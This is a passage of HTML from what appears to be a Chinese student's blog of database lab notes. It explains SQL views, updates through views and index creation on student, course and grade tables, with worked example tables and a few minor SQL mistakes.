class="hljs-operator">*</span>),<span class="hljs-built_in">avg</span>(sage)<br><span class="hljs-keyword">FROM</span> student<br><span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> sdept;<br><br>#<span class="hljs-number">4.</span>将各位学生学号、选修课程的门数及平均成绩定义为视图V_AVG_S_G。<br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">VIEW</span> V_AVG_S_G(sno,num,agrade)<br><span class="hljs-keyword">AS</span><br><span class="hljs-keyword">SELECT</span> sno,<span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>),<span class="hljs-built_in">avg</span>(grade)<br><span class="hljs-keyword">FROM</span> SC<br><span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> sno;<br><br>#<span class="hljs-number">5.</span>将各门课程的课程号、选修人数及平均成绩定义为视图V_AVG_C_G。<br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">VIEW</span> V_AVG_C_G(cno,num,agrade)<br><span class="hljs-keyword">AS</span><br><span class="hljs-keyword">SELECT</span> cno,<span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>),<span class="hljs-built_in">avg</span>(grade)<br><span class="hljs-keyword">FROM</span> V_S_C_G<br><span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> cno;<br><br>#<span class="hljs-number">6.1</span>通过视图V_IS，将学号为“<span class="hljs-number">08001</span>”的学生姓名更改为“张小立” ,并查看结果;<br><span class="hljs-keyword">UPDATE</span> V_IS<br><span class="hljs-keyword">SET</span> Sname<span class="hljs-operator">=</span><span class="hljs-string">&#x27;张小立&#x27;</span><br><span class="hljs-keyword">WHERE</span> Sno<span class="hljs-operator">=</span><span class="hljs-string">&#x27;08001&#x27;</span>;<br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span><br><span class="hljs-keyword">FROM</span> V_IS;<br><br>#<span class="hljs-number">6.2</span>通过视图V_IS，新增加一个学生记录(<span class="hljs-string">&#x27;08030&#x27;</span>,<span class="hljs-string">&#x27; 李莉&#x27;</span>,<span class="hljs-number">18</span>, <span class="hljs-string">&#x27; 女&#x27;</span>,<span class="hljs-string">&#x27;IS&#x27;</span>)，并查看结果。<br><span class="hljs-keyword">INSERT</span><br><span class="hljs-keyword">INTO</span> V_IS<br><span class="hljs-keyword">VALUES</span>(<span class="hljs-string">&#x27;08030&#x27;</span>,<span class="hljs-string">&#x27; 李莉&#x27;</span>,<span class="hljs-number">18</span>, <span class="hljs-string">&#x27; 女&#x27;</span>,<span class="hljs-string">&#x27;IS&#x27;</span>);<br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span><br><span class="hljs-keyword">FROM</span> V_IS;<br><br>#<span class="hljs-number">6.3</span>通过视图V_IS，删除学号为“<span class="hljs-number">08030</span>”的学生信息，并查看结果。<br><span class="hljs-keyword">DELETE</span><br><span class="hljs-keyword">FROM</span> V_IS<br><span class="hljs-keyword">WHERE</span> sno<span class="hljs-operator">=</span><span class="hljs-string">&#x27;08030&#x27;</span>;<br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span><br><span class="hljs-keyword">FROM</span> V_IS;<br><br>#<span class="hljs-number">6.4</span>通过视图V_S_C_G，将学号“<span class="hljs-number">08002</span>”的姓名改为“刘晓晨”，能否实现若无法实现说明原因<br><span class="hljs-keyword">UPDATE</span> V_S_C_G<br><span class="hljs-keyword">SET</span> sname <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;刘晓晨&#x27;</span><br><span class="hljs-keyword">WHERE</span> sno <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;08002&#x27;</span>;<br>#不能实现，因为视图在聚集函数（<span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span>）中不能修改；<br><br>#<span class="hljs-number">6.5</span>通过视图V_AVG_S_G，将学号“<span class="hljs-number">08003</span>”的平均成绩改为<span class="hljs-number">90</span>，能否实现若无法实现说明原因。<br><span class="hljs-keyword">UPDATE</span> V_AVG_S_G<br><span class="hljs-keyword">SET</span> agrade<span class="hljs-operator">=</span><span class="hljs-string">&#x27;90&#x27;</span><br><span class="hljs-keyword">WHERE</span> sno<span class="hljs-operator">=</span><span class="hljs-string">&#x27;08003&#x27;</span>;<br>#不能实现更新，因为视图在聚集函数（<span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span>）中不能修改；<br><br>#<span class="hljs-number">7.</span>利用表和前面所建视图，查询平均成绩为<span class="hljs-number">90</span> 分以上的学生学号、姓名和成绩；<br><span class="hljs-keyword">SELECT</span> student.sno , student.sname , V_AVG_S_G.agrade<br><span class="hljs-keyword">FROM</span> V_AVG_S_G , student<br><span class="hljs-keyword">WHERE</span> student.sno <span class="hljs-operator">=</span> V_AVG_S_G.sno<br><span class="hljs-keyword">HAVING</span> V_AVG_S_G.agrade <span class="hljs-operator">&gt;</span><span class="hljs-number">90</span> ;<br><br>#<span class="hljs-number">8.</span>利用表和前面所建视图，查询成绩大于课程平均成绩的学生学号、课程号和成绩；<br><span class="hljs-keyword">SELECT</span> sc.sno , sc.cno , sc.grade<br><span class="hljs-keyword">FROM</span> V_AVG_C_G , sc<br><span class="hljs-keyword">WHERE</span> sc.cno <span class="hljs-operator">=</span> V_AVG_C_G.cno <span class="hljs-keyword">AND</span> sc.grade <span class="hljs-operator">&gt;</span> V_AVG_C_G.agrade;<br><br>#<span class="hljs-number">9.</span>利用表和前面所建视图，按系分组统计平均成绩<span class="hljs-number">80</span> 分以上的人数，按降序排列。<br><span class="hljs-keyword">SELECT</span> student.sdept,<span class="hljs-built_in">COUNT</span>(student.sno) 人数<br><span class="hljs-keyword">FROM</span> V_AVG_S_G a, student<br><span class="hljs-keyword">WHERE</span> a.agrade <span class="hljs-operator">&gt;=</span> <span class="hljs-number">80</span> <span class="hljs-keyword">AND</span> a.sno <span class="hljs-operator">=</span> student.sno<br><span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> sdept<br><span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> <span class="hljs-built_in">COUNT</span>(student.sno) <span class="hljs-keyword">DESC</span>;<br><br>#<span class="hljs-number">10.</span>为student 表创建一个复合索引i_sdept_sno ，以院系升序、学号降序。<br><span class="hljs-keyword">CREATE</span> INDEX i_sdept_sno <span class="hljs-keyword">ON</span> student(sdept <span class="hljs-keyword">ASC</span>,sno <span class="hljs-keyword">DESC</span>);<br><br>#<span class="hljs-number">11.</span>在student 表的sname 列上建立普通降序索引。<br><span class="hljs-keyword">CREATE</span> INDEX gname <span class="hljs-keyword">ON</span> student(sname <span class="hljs-keyword">DESC</span>);<br><br>#<span class="hljs-number">12.</span>在course 表的cname 列上建立唯一索引。<br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">UNIQUE</span> INDEX zname <span class="hljs-keyword">ON</span> course(cname);<br><br>#<span class="hljs-number">13.</span>将索引i_sdept_sno 的名称改为i_s。<br><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> student RENAME INDEX i_sdept_sno <span class="hljs-keyword">TO</span> i_s;<br><br>#<span class="hljs-number">14.</span>删除索引i_s。<br><span class="hljs-keyword">DROP</span> INDEX i_s <span class="hljs-keyword">ON</span> student;<br><br></code></pre></td></tr></table></figure><h5 id="1-定义信息系学生基本情况视图V-IS。"><a href="#1-定义信息系学生基本情况视图V-IS。" class="headerlink" title="1.定义信息系学生基本情况视图V_IS。"></a>1.定义信息系学生基本情况视图V_IS。</h5><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">VIEW</span> V_IS<br><span class="hljs-keyword">AS</span><br><span class="hljs-keyword">SELECT</span> *<br><span class="hljs-keyword">FROM</span> student<br><span class="hljs-keyword">WHERE</span> sdept =<span class="hljs-string">&#x27;is&#x27;</span>;<br><br>这条 <span class="hljs-keyword">SQL</span> 语句的功能是创建一个视图 V_IS，该视图将展示 student 表中所有 sdept 等于 <span class="hljs-string">&#x27;is&#x27;</span> 的记录。也就是说，视图 V_IS 将包含所有专业为 <span class="hljs-string">&#x27;is&#x27;</span> 的学生的所有列（假设有多个字段，如学号、姓名、年龄等）。<br></code></pre></td></tr></table></figure><p><strong>语法分析：</strong></p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">VIEW</span> V_IS：<br>    这部分定义了视图的名称为 V_IS。<br>    视图是一个虚拟的表，它并不存储数据，而是存储一个查询。当你查询视图时，实际上是在执行视图背后的查询语句。<br>    通过视图，你可以对数据进行抽象和封装，简化复杂查询的执行。<br><br><span class="hljs-keyword">AS</span>：<br>    这个<span class="hljs-keyword">AS</span>不是起别名的意思<br>    关键字 <span class="hljs-keyword">AS</span> 表示后面跟着的是视图的定义，即该视图的查询内容。<br>    在这个例子中，<span class="hljs-keyword">AS</span> 后面的 <span class="hljs-keyword">SELECT</span> 查询将定义视图 V_IS 的数据来源和结构。<br><br><span class="hljs-keyword">SELECT</span> *：<br>    <span class="hljs-keyword">SELECT</span> * 表示从表中选择所有列。<br>    在这个查询中，* 表示选择 student 表中的所有列（假设 student 表有多个字段，比如 sno、sname、age 等）。<br><br><span class="hljs-keyword">FROM</span> student：<br>    这表示查询的数据来源是 student 表。<br>    student 表应该包含学生的各种信息（如学号、姓名、性别、专业等）。<br><br><span class="hljs-keyword">WHERE</span> sdept = <span class="hljs-string">&#x27;is&#x27;</span>：<br>    这是查询的条件，意味着只会选取 student 表中 sdept 列值为 <span class="hljs-string">&#x27;is&#x27;</span> 的记录。<br>    假设 sdept 是学生表中的一个字段，表示学生的专业或学院，<span class="hljs-string">&#x27;is&#x27;</span> 是该字段中的一个值，例如表示信息科学（Information Science）。<br><br></code></pre></td></tr></table></figure><h5 id="2-将Student-Course-和SC表中学生的学号，姓名，课程号，课程名，成绩定义为视图V-S-C-G。"><a href="#2-将Student-Course-和SC表中学生的学号，姓名，课程号，课程名，成绩定义为视图V-S-C-G。" class="headerlink" title="2.将Student,Course 和SC表中学生的学号，姓名，课程号，课程名，成绩定义为视图V_S_C_G。"></a>2.将Student,Course 和SC表中学生的学号，姓名，课程号，课程名，成绩定义为视图V_S_C_G。</h5><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">CREATE VIEW V_S_C_G(sno,sname,cno,cnmae,grade)<br>AS<br>SELECT student.sno,sname,<span class="hljs-keyword">sc.cno,course.Cname,grade</span><br><span class="hljs-keyword"></span>FROM student,course,<span class="hljs-keyword">sc</span><br><span class="hljs-keyword"></span>WHERE student.Sno=<span class="hljs-keyword">sc.sno </span><span class="hljs-keyword">AND </span><span class="hljs-keyword">sc.Cno=course.Cno;</span><br><span class="hljs-keyword"></span><br>步骤：<br><span class="hljs-number">1</span>. CREATE VIEW V_S_C_G(sno,sname,cno,cnmae,grade)<br>AS 创建视图<br><span class="hljs-number">2</span>. SELECT student.sno,sname,<span class="hljs-keyword">sc.cno,course.Cname,grade</span><br><span class="hljs-keyword"></span>选择操作的点<br><span class="hljs-number">3</span>.FROM student,course,<span class="hljs-keyword">sc</span><br><span class="hljs-keyword"></span>选表<br><span class="hljs-number">4</span>.WHERE student.Sno=<span class="hljs-keyword">sc.sno </span><span class="hljs-keyword">AND </span><span class="hljs-keyword">sc.Cno=course.Cno;</span><br><span class="hljs-keyword"></span>过滤条件，它决定了从三个表中选择哪些记录来进行匹配。<br><br>student.Sno = <span class="hljs-keyword">sc.sno：</span><br><span class="hljs-keyword"></span><br>    这是连接 student 表和 <span class="hljs-keyword">sc </span>表的条件。<br>    student.Sno 是学生表中的学号列，<span class="hljs-keyword">sc.sno </span>是成绩表（<span class="hljs-keyword">sc）中的学号列。</span><br><span class="hljs-keyword"></span>    这个条件确保了从 student 表中选择的学生记录，与 <span class="hljs-keyword">sc </span>表中对应的成绩记录正确匹配。<br>    换句话说，只有当 student 表中的学号与 <span class="hljs-keyword">sc </span>表中的学号相等时，才会将这两张表的记录连接在一起。<br><br><span class="hljs-keyword">sc.Cno </span>= course.Cno：<br><br>    这是连接 <span class="hljs-keyword">sc </span>表和 course 表的条件。<br>    <span class="hljs-keyword">sc.Cno </span>是成绩表（<span class="hljs-keyword">sc）中的课程号列，course.Cno </span>是课程表（course）中的课程号列。<br>    这个条件确保了从 <span class="hljs-keyword">sc </span>表中选择的课程号，能够与 course 表中的课程记录相匹配。<br>    换句话说，只有当 <span class="hljs-keyword">sc </span>表中的课程号与 course 表中的课程号相等时，才会将这两张表的记录连接在一起<br><br></code></pre></td></tr></table></figure><p><strong>举个例子：</strong></p><p>假设有如下三张表：</p><ul><li><p><code>student</code> 表（学生信息）：</p><table><thead><tr><th>Sno</th><th>Sname</th></tr></thead><tbody><tr><td>001</td><td>张三</td></tr><tr><td>002</td><td>李四</td></tr></tbody></table></li><li><p><code>sc</code> 表（学生成绩）：</p><table><thead><tr><th>Sno</th><th>Cno</th><th>Grade</th></tr></thead><tbody><tr><td>001</td><td>101</td><td>85</td></tr><tr><td>001</td><td>102</td><td>90</td></tr><tr><td>002</td><td>101</td><td>88</td></tr></tbody></table></li><li><p><code>course</code> 表（课程信息）：</p><table><thead><tr><th>Cno</th><th>Cname</th></tr></thead><tbody><tr><td>101</td><td>数学</td></tr><tr><td>102</td><td>物理</td></tr></tbody></table></li></ul><p>在查询时，<code>student.Sno = sc.sno AND sc.Cno = course.Cno</code> 通过以下步骤进行匹配：</p><ul><li><p>连接 <code>student</code> 和 <code>sc</code> 表，首先匹配学号。</p></li><li><p>然后，连接 <code>sc</code> 和 <code>course</code> 表，匹配课程号。</p></li><li><p>结果如下：</p><table><thead><tr><th>Sno</th><th>Sname</th><th>Cno</th><th>Cname</th><th>Grade</th></tr></thead><tbody><tr><td>001</td><td>张三</td><td>101</td><td>数学</td><td>85</td></tr><tr><td>001</td><td>张三</td><td>102</td><td>物理</td><td>90</td></tr><tr><td>002</td><td>李四</td><td>101</td><td>数学</td><td>88</td></tr></tbody></table></li></ul><h5 id="3-将各系学生人数，平均年龄定义为视图V-NUM-AVG。"><a href="#3-将各系学生人数，平均年龄定义为视图V-NUM-AVG。" class="headerlink" title="3.将各系学生人数，平均年龄定义为视图V_NUM_AVG。"></a>3.将各系学生人数，平均年龄定义为视图V_NUM_AVG。</h5><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">VIEW</span> V_NUM_AVG(sdept,num,asage)<br><span class="hljs-keyword">AS</span><br><span class="hljs-keyword">SELECT</span> sdept,<span class="hljs-built_in">count</span>(*),<span class="hljs-built_in">avg</span>(sage)<br><span class="hljs-keyword">FROM</span> student<br><span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> sdept;<br></code></pre></td></tr></table></figure><p><img src="/2024/11/01/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/5cb91aac5b1970e69559d094c9e009d.png" alt="5cb91aac5b1970e69559d094c9e009d"></p><p><strong>解释count(*)</strong>:</p><p>假设有如下的 <code>student</code> 表：</p><table><thead><tr><th>sno</th><th>sname</th><th>sdept</th><th>sage</th></tr></thead><tbody><tr><td>001</td><td>张三</td><td>计算机</td><td>20</td></tr><tr><td>002</td><td>李四</td><td>数学</td><td>21</td></tr><tr><td>003</td><td>王五</td><td>计算机</td><td>22</td></tr><tr><td>004</td><td>赵六</td><td>数学</td><td>23</td></tr><tr><td>005</td><td>钱七</td><td>计算机</td><td>21</td></tr></tbody></table><p>在这个例子中，假设我们根据 <code>sdept</code> （即学生的系别）进行分组。</p><p><strong>执行 <code>COUNT(*)</code> 的计算：</strong></p><ul><li><strong>计算机系</strong>（<code>sdept = &#39;计算机&#39;</code>）有三位学生（张三、王五、钱七），因此 <code>COUNT(*)</code> 返回 <strong>3</strong>。</li><li><strong>数学系</strong>（<code>sdept = &#39;数学&#39;</code>）有两位学生（李四、赵六），因此 <code>COUNT(*)</code> 返回 <strong>2</strong>。</li></ul><p><strong>执行 <code>AVG(sage)</code> 的计算：</strong></p><ul><li><strong>计算机系</strong>的学生年龄分别是：20、22、21，平均年龄 <code>AVG(sage)</code> &#x3D; (20 + 22 + 21) &#x2F; 3 &#x3D; <strong>21</strong>。</li><li><strong>数学系</strong>的学生年龄分别是：21、23，平均年龄 <code>AVG(sage)</code> &#x3D; (21 + 23) &#x2F; 2 &#x3D; <strong>22</strong>。</li></ul><p><strong>最终查询结果：</strong></p><table><thead><tr><th>sdept</th><th>num</th><th>asage</th></tr></thead><tbody><tr><td>计算机</td><td>3</td><td>21</td></tr><tr><td>数学</td><td>2</td><td>22</td></tr></tbody></table><h5 id="4-将各位学生学号、选修课程的门数及平均成绩定义为视图V-AVG-S-G。"><a href="#4-将各位学生学号、选修课程的门数及平均成绩定义为视图V-AVG-S-G。" class="headerlink" title="#4.将各位学生学号、选修课程的门数及平均成绩定义为视图V_AVG_S_G。"></a>#4.将各位学生学号、选修课程的门数及平均成绩定义为视图V_AVG_S_G。</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">VIEW</span> V_AVG_S_G(sno,num,agrade)<br><span class="hljs-keyword">AS</span><br><span class="hljs-keyword">SELECT</span> sno,<span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>),<span class="hljs-built_in">avg</span>(grade)<br><span class="hljs-keyword">FROM</span> SC<br><span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> sno;<br></code></pre></td></tr></table></figure><p>再解释这个count(*)</p><p>假设 <code>SC</code> 表的数据如下：</p><table><thead><tr><th>sno</th><th>cno</th><th>grade</th></tr></thead><tbody><tr><td>001</td><td>101</td><td>85</td></tr><tr><td>001</td><td>102</td><td>90</td></tr><tr><td>001</td><td>103</td><td>88</td></tr><tr><td>002</td><td>101</td><td>78</td></tr><tr><td>002</td><td>102</td><td>82</td></tr><tr><td>003</td><td>101</td><td>91</td></tr></tbody></table><ul><li><strong>对于学生 001</strong>:<ul><li><code>count(*)</code> 会统计学生 001 的选课记录数。在这个表中，学生 001 选修了 3 门课程（101, 102, 103），所以 <code>count(*)</code> 的结果是 <strong>3</strong>。</li></ul></li><li><strong>对于学生 002</strong>:<ul><li><code>count(*)</code> 会统计学生 002 的选课记录数，学生 002 选修了 2 门课程（101, 102），所以 <code>count(*)</code> 的结果是 <strong>2</strong>。</li></ul></li><li><strong>对于学生 003</strong>:<ul><li><code>count(*)</code> 会统计学生 003 的选课记录数，学生 003 选修了 1 门课程（101），所以 <code>count(*)</code> 的结果是 <strong>1</strong>。</li></ul></li></ul><p><strong>最终查询结果：</strong></p><p>根据上述数据，查询结果会是：</p><table><thead><tr><th>sno</th><th>num</th><th>agrade</th></tr></thead><tbody><tr><td>001</td><td>3</td><td>87.67</td></tr><tr><td>002</td><td>2</td><td>80.00</td></tr><tr><td>003</td><td>1</td><td>91.00</td></tr></tbody></table><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">num 列显示的是每个学生选修的课程数量（通过 `count(*)` 计算）。<br>agrade列显示的是每个学生的成绩平均值（通过 `avg(grade)` 计算）。<br></code></pre></td></tr></table></figure><h5 id="6-1通过视图V-IS，将学号为“08001”的学生姓名更改为“张小立”-并查看结果"><a href="#6-1通过视图V-IS，将学号为“08001”的学生姓名更改为“张小立”-并查看结果" class="headerlink" title="6.1通过视图V_IS，将学号为“08001”的学生姓名更改为“张小立” ,并查看结果;"></a>6.1通过视图V_IS，将学号为“08001”的学生姓名更改为“张小立” ,并查看结果;</h5><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs routeros">UPDATE V_IS<br><span class="hljs-built_in">SET</span> <span class="hljs-attribute">Sname</span>=<span class="hljs-string">&#x27;张小立&#x27;</span><br>WHERE <span class="hljs-attribute">Sno</span>=<span class="hljs-string">&#x27;08001&#x27;</span>;<br>SELECT *<br><span class="hljs-keyword">FROM</span> V_IS;<br><br>UPDATE V_IS<br><span class="hljs-built_in">SET</span> <span class="hljs-attribute">Sname</span>=<span class="hljs-string">&#x27;张小立&#x27;</span><br>WHERE <span class="hljs-attribute">Sno</span>=<span class="hljs-string">&#x27;08001&#x27;</span>;<br>这个语句就是更新数据：<br>SELECT *<br><span class="hljs-keyword">FROM</span> V_IS;<br>此语句会查询视图 V_IS 中的所有数据，包括所有列。它会返回 V_IS 中的当前数据，包括你在上一步通过 UPDATE 修改的数据。<br></code></pre></td></tr></table></figure><p><strong>更新数据</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">UPDATE &lt;表名&gt; <span class="hljs-built_in">SET</span> 字段<span class="hljs-attribute">1</span>=值1, 字段<span class="hljs-attribute">2</span>=值2  WHERE &lt;条件表达式&gt;;<br></code></pre></td></tr></table></figure><p>假设有一个名为 <code>employees</code> 的表，包含以下字段：</p><ul><li><code>id</code>：员工编号</li><li><code>first_name</code>：员工名字</li><li><code>last_name</code>：员工姓氏</li><li><code>salary</code>：员工工资</li></ul><p>如果想要将 <code>id</code> 为 <code>1</code> 的员工的名字修改为 <code>&#39;Jane&#39;</code>，并将工资更新为 <code>5000</code>，可以使用以下语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">UPDATE</span> employees <span class="hljs-keyword">SET</span> first_name <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;Jane&#x27;</span>, salary <span class="hljs-operator">=</span> <span class="hljs-number">5000</span> <span class="hljs-keyword">WHERE</span> id <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><h5 id="6-2通过视图V-IS，新增加一个学生记录-‘08030’-’-李莉’-18-‘-女’-’IS’-，并查看结果。"><a href="#6-2通过视图V-IS，新增加一个学生记录-‘08030’-’-李莉’-18-‘-女’-’IS’-，并查看结果。" class="headerlink" title="6.2通过视图V_IS，新增加一个学生记录(‘08030’,’ 李莉’,18, ‘ 女’,’IS’)，并查看结果。"></a>6.2通过视图V_IS，新增加一个学生记录(‘08030’,’ 李莉’,18, ‘ 女’,’IS’)，并查看结果。</h5><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">INSERT</span><br><span class="hljs-keyword">INTO</span> V_IS<br><span class="hljs-keyword">VALUES</span>(<span class="hljs-string">&#x27;08030&#x27;</span>,<span class="hljs-string">&#x27; 李莉&#x27;</span>,<span class="hljs-number">18</span>, <span class="hljs-string">&#x27; 女&#x27;</span>,<span class="hljs-string">&#x27;IS&#x27;</span>);<br><br>插入语句：<br><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> 视图<br><span class="hljs-keyword">VALUES</span> (value1,value2,value3,...);<br></code></pre></td></tr></table></figure><h5 id="6-3通过视图V-IS，删除学号为“08030”的学生信息，并查看结果。"><a href="#6-3通过视图V-IS，删除学号为“08030”的学生信息，并查看结果。" class="headerlink" title="6.3通过视图V_IS，删除学号为“08030”的学生信息，并查看结果。"></a>6.3通过视图V_IS，删除学号为“08030”的学生信息，并查看结果。</h5><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">DELETE</span><br><span class="hljs-keyword">FROM</span> V_IS<br><span class="hljs-keyword">WHERE</span> sno=<span class="hljs-string">&#x27;08030&#x27;</span>;<br><br>实际上就是删除语句<br><span class="hljs-keyword">DELETE</span> <span class="hljs-keyword">FROM</span> &lt;表名&gt; <span class="hljs-keyword">WHERE</span> &lt;条件表达式&gt;;<br></code></pre></td></tr></table></figure><h5 id="6-4-6-5通过视图V-S-C-G，将学号“08002”的姓名改为“刘晓晨”，能否实现若无法实现说明原因"><a href="#6-4-6-5通过视图V-S-C-G，将学号“08002”的姓名改为“刘晓晨”，能否实现若无法实现说明原因" class="headerlink" title="6.4&amp;6.5通过视图V_S_C_G，将学号“08002”的姓名改为“刘晓晨”，能否实现若无法实现说明原因"></a>6.4&amp;6.5通过视图V_S_C_G，将学号“08002”的姓名改为“刘晓晨”，能否实现若无法实现说明原因</h5><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">UPDATE</span> V_S_C_G<br><span class="hljs-keyword">SET</span> sname = <span class="hljs-string">&#x27;刘晓晨&#x27;</span><br><span class="hljs-keyword">WHERE</span> sno = <span class="hljs-string">&#x27;08002&#x27;</span>;<br>#不能实现，因为视图在聚集函数（<span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span>）中不能修改；<br>由于视图 V_AVG_S_G 是基于聚集函数和分组操作创建的，不能直接通过 <span class="hljs-keyword">UPDATE</span> 语句修改它的内容。<br></code></pre></td></tr></table></figure><p>**并不是将 <code>&#39;08002&#39;</code> 改为 <code>&#39;刘晓晨&#39;</code><strong>，而是</strong>将 <code>sname</code> 字段的值更新为 <code>&#39;刘晓晨&#39;</code>**，对于 <code>sno = &#39;08002&#39;</code> 的那一行记录。</p><p><strong>具体解释：</strong></p><ol><li>**<code>sname = &#39;刘晓晨&#39;</code>**：这表示你将目标行的 <code>sname</code> 字段（即学生姓名）更新为 <code>&#39;刘晓晨&#39;</code>。</li><li>**<code>WHERE sno = &#39;08002&#39;</code>**：这是更新的条件，指定了只更新 <code>sno</code> 等于 <code>&#39;08002&#39;</code> 的记录。<code>sno</code> 应该是学生的学号。</li></ol><p>因此，执行该语句后，表中 <code>sno</code> 为 <code>&#39;08002&#39;</code> 的学生的姓名将被修改为 <code>&#39;刘晓晨&#39;</code>，而 <strong><code>sno</code> 字段的值</strong>（即学号） <strong>不会发生变化</strong>。</p><p><strong>举个例子：</strong></p><p>假设 <code>V_S_C_G</code> 表的初始数据如下：</p><table><thead><tr><th>sno</th><th>sname</th></tr></thead><tbody><tr><td>08001</td><td>张伟</td></tr><tr><td>08002</td><td>王刚</td></tr><tr><td>08003</td><td>李娜</td></tr></tbody></table><p>执行更新语句后，表的数据将变成：</p><table><thead><tr><th>sno</th><th>sname</th></tr></thead><tbody><tr><td>08001</td><td>张伟</td></tr><tr><td>08002</td><td>刘晓晨</td></tr><tr><td>08003</td><td>李娜</td></tr></tbody></table><p>如上所示，**学号 <code>&#39;08002&#39;</code> 的学生的姓名改为了 <code>&#39;刘晓晨&#39;</code>**，但是学号 <code>&#39;08002&#39;</code> 没有被改变。更新的不是学号 <code>sno</code>，而是学生的姓名 <code>sname</code>，学号仍然保持不变。</p><h5 id="7-利用表和前面所建视图，查询平均成绩为90-分以上的学生学号、姓名和成绩；"><a href="#7-利用表和前面所建视图，查询平均成绩为90-分以上的学生学号、姓名和成绩；" class="headerlink" title="7.利用表和前面所建视图，查询平均成绩为90 分以上的学生学号、姓名和成绩；"></a>7.利用表和前面所建视图，查询平均成绩为90 分以上的学生学号、姓名和成绩；</h5><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code 